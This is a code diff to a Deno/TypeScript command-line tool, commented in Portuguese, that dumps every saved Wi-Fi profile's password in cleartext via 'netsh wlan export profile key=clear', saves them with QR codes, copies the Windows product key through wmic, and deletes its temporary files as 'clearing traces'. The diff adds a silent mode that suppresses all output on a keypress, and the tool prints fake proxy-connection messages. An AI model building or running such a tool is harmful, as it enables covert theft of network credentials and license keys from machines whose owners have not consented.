@@ -1,4 +1,5 @@
 import { SpinnerTypes, TerminalSpinner } from '@spinners';
+import { keypress } from '@cliffy/keypress';
 import { Select } from '@cliffy/select';
 import { DateTime } from '@luxon';
 import colors from '@colors';
@@ -9,7 +10,19 @@ import qr from '@qrcode';
 const title: string = await Deno.readTextFile('Title.txt')
 	.catch(() => '');
 
-let currentMenu: string;
+let showLogs: boolean | number = true;
+/** showLogs
+ * Se for false, nada será exibido no console
+ * e os delays serão desativados
+ */
+
+const sleep = (timeout: number) => showLogs ? delay(timeout) : null;
+/** sleep()
+ * Função intermediária para delay()
+ * verifica se o silent mode is on
+ */
+
+let currentMenu: string; // string exibida no sector do spinner
 colors;
 menu(); // Abre o menu
 
@@ -29,6 +42,13 @@ async function menu() {
 			{ name: '- Encerrar', value: '0' },
 		],
 	});
+
+	silentMode();
+	/** SilentMode()
+	 * Ativa o Listener para o teclado
+	 * Coloquei essa função após o menu pois pode causar
+	 * conflitos com o Listener do Select Menu
+	 */
 
 	switch (input) {
 		case '0':
@@ -53,13 +73,64 @@ async function menu() {
 			break;
 	}
 
-	// Voltando ao menu inicial
-	setTimeout(() => menu(), 5_000);
-	return;
+	// Encerrando...
+	Deno.exit();
 }
 
 async function NetSHProfileCollector() {
 	currentMenu = 'Wi-Fi CLONER';
+
+	Deno.mkdir('.tempdata') // Cria pasta de arquivos temporários (se não existir)
+		.catch(() => {});
+
+	Deno.mkdir('WiFiPasswords') // Cria pasta de senhas (se não existir)
+		.catch(() => {});
+
+	// Chama a API do Windows
+	await executeCommand(
+		'netsh wlan export profile key=clear folder=.tempdata',
+	);
+
+	let counter = 0;
+	/** counter
+	 * Fiz um counter manual pois o readDir retorna um Iterable<Deno.DirEntry>
+	 * e eu não quis quebrar a cabeça com algo tão fútil quanto pegar o length disso
+	 */
+
+	const timestamp = DateTime.now()
+		.setZone('America/Sao_Paulo')
+		.setLocale('pt')
+		.toFormat('DDDD'); // Data formatada
+
+	for await (const file of Deno.readDir('.tempdata')) {
+		/** for
+		 * Por padrão, A API fornece as informações em arquivos XML bem poluídos
+		 * Então eu fiz essa bosta aqui pra deixar só o que é realmente importante
+		 */
+		counter++;
+
+		// Lendo o conteúdo do arquivo
+		const content = await Deno.readTextFile(`.tempdata/${file.name}`);
+
+		// Filtrando as tags que são úteis
+		const [SSID, , security, password] = clearTags(content.matchAll(
+			/<(name|authentication|keyMaterial)>.*?<\/.*>/g,
+		));
+
+		// Gerando QR Code para conectar
+		let wifiQR;
+		qr.generate(
+			`WIFI:S:${SSID};T:${security};P:${password};H:false;;`,
+			{ small: true },
+			(qrCode: string) => wifiQR = qrCode,
+		);
+
+		// Escrevendo arquivos com as informações filtradas no diretório final
+		await Deno.writeTextFile(
+			`WiFiPasswords/${SSID}.txt`,
+			`SSID: ${SSID}\nData: ${timestamp}\nSegurança: ${security}\nSenha: ${password}\n\n${wifiQR}`,
+		);
+	}
 
 	const statuses = [
 		['Preparando servidor Proxy...', 'Proxy #0 operante.'],
@@ -77,69 +148,16 @@ async function NetSHProfileCollector() {
 	}
 
 	const spinner = new Spinner('Clonando redes Wi-Fi...');
-
-	Deno.mkdir('.tempdata') // Cria pasta de arquivos temporários (se não existir)
-		.catch(() => {});
-
-	Deno.mkdir('WiFiPasswords') // Cria pasta de senhas (se não existir)
-		.catch(() => {});
-
-	// Chamando a API do Windows
-	await executeCommand(
-		'netsh wlan export profile key=clear folder=.tempdata',
-	);
-
-	// Fiz um counter manual pois o readDir retorna um Iterable<Deno.DirEntry>
-	// e eu não quis quebrar a cabeça com algo tão fútil quanto pegar o length disso
-	let counter = 0;
-
-	const timestamp = DateTime.now()
-		.setZone('America/Sao_Paulo')
-		.setLocale('pt')
-		.toFormat('DDDD');
-
-	// Por padrão, A API fornece as informações em arquivos XML bem poluídos
-	// Então eu fiz essa bosta aqui pra deixar só o que é realmente importante
-	for await (const file of Deno.readDir('.tempdata')) {
-		counter++;
-
-		// Lendo conteúdo do arquivo
-		const content = await Deno.readTextFile(`.tempdata/${file.name}`);
-
-		// Filtrando tags que são úteis
-		const [SSID, , security, password] = clearTags(content.matchAll(
-			/<(name|authentication|keyMaterial)>.*?<\/.*>/g,
-		));
-
-		// Gerando QR Code para conectar
-		let wifiQR;
-		qr.generate(
-			`WIFI:S:${SSID};T:${security};P:${password};H:false;;`,
-			{
-				small: true,
-			},
-			(qrCode: string) => wifiQR = qrCode,
-		);
-
-		// Escrevendo arquivos com as informações filtradas no diretório final
-		Deno.writeTextFileSync(
-			`WiFiPasswords/${SSID}.txt`,
-			`SSID: ${SSID}\nData: ${timestamp}\nSegurança: ${security}\nSenha: ${password}\n\n${wifiQR}`,
-		);
-	}
-
 	spinner.end(`${counter} redes clonadas.`);
 
 	await clearTraces(); // Limpar registros
-
-	Deno.exit(); // Encerra o processo pra agilizar
 }
 
 async function copyWinKey() {
 	currentMenu = 'KEY CLONER';
 
 	const status = new Spinner('Obtendo chave de ativação...');
-	await delay(3_000);
+	await sleep(3_000);
 
 	const key = (await executeCommand(
 		'wmic path softwarelicensingservice get OA3xOriginalProductKey',
@@ -156,20 +174,18 @@ async function copyWinKey() {
 		`WindowsKeys/${Deno.hostname()}.txt`,
 		`Machine: ${Deno.hostname()}\nWindows License Key: ${key}`,
 	);
-	return;
 }
 
 async function clearTraces() {
 	currentMenu = 'CLEANER';
 
 	const status = new Spinner('Apagando registros...');
-	await delay(random(500, 3_000));
+	await sleep(random(500, 3_000));
 
-	Deno.remove('.tempdata', { recursive: true })
+	await Deno.remove('.tempdata', { recursive: true })
 		// 'recursive' significa que é pra apagar mesmo se tiver arquivos dentro
 		.then(() => status.end('Registros excluídos.'))
 		.catch(() => status.fail('Nada para excluir.'));
-	return;
 }
 
 async function executeCommand(cmd: string) {
@@ -203,9 +219,8 @@ function clearTags(matches: IterableIterator<RegExpMatchArray>) {
 async function createFakeStatus(loadingMsg: string, completeMsg: string) {
 	const status = new Spinner(loadingMsg, currentMenu);
 
-	await delay(random(1_000, 3_500));
+	await sleep(random(1_000, 3_500));
 	status.end(completeMsg);
-	return;
 }
 
 function random(min: number, max: number) {
@@ -213,48 +228,59 @@ function random(min: number, max: number) {
 	return Math.floor(Math.random() * (max - min) + min);
 }
 
+async function silentMode() {
+	for await (const event of keypress()) {
+		if (event.ctrlKey && event.key === 'c') Deno.exit();
+
+		// quando a tecla S for pressionada
+		if (event.key === 's') showLogs = false;
+		// ativa o silent mode
+	}
+}
+
 class Spinner {
 	sector: string;
 	text: string;
-	spinner: TerminalSpinner;
+	spinner: TerminalSpinner | undefined;
 
 	constructor(text: string, sector?: string) {
 		this.sector = sector || currentMenu;
 		this.text = text;
 
 		// Inicia Spinner
-		this.spinner = new TerminalSpinner({
-			text: this._format(),
-			spinner: {
-				interval: 40,
-				frames: SpinnerTypes.dots.frames,
-			},
-			indent: 1,
-			color: 'cyan',
-		}).start();
+		showLogs &&
+			(this.spinner = new TerminalSpinner({
+				text: this._format(),
+				spinner: {
+					interval: 40,
+					frames: SpinnerTypes.dots.frames,
+				},
+				indent: 1,
+				color: 'cyan',
+			}).start());
 	}
 
 	end(msg?: string) {
 		this.text = msg || this.text;
-		this.spinner.succeed(this._format());
+		this.spinner?.succeed(this._format());
 	}
 
 	fail(msg?: string) {
 		this.text = msg || this.text;
-		this.spinner.fail(this._format());
+		this.spinner?.fail(this._format());
 	}
 
 	_format() {
-		const date = new Date();
-		const minutes = date.getMinutes() < 10
-			? '0' + date.getMinutes()
-			: date.getMinutes();
+		const now = DateTime.now()
+			.setZone('America/Sao_Paulo')
+			.setLocale('pt')
+			.toFormat('T');
 
 		return [ // Modelo de string
 			'[',
 			this.sector.toUpperCase().cyan, // [ SECTOR
 			'|',
-			`${date.getHours()}:${minutes}`.yellow, // [ SECTOR | 18:04
+			now.yellow, // [ SECTOR | 18:04
 			'] -',
 			this.text,
 		].join(' '); // [ SETOR | 18:04 ] - TEXT
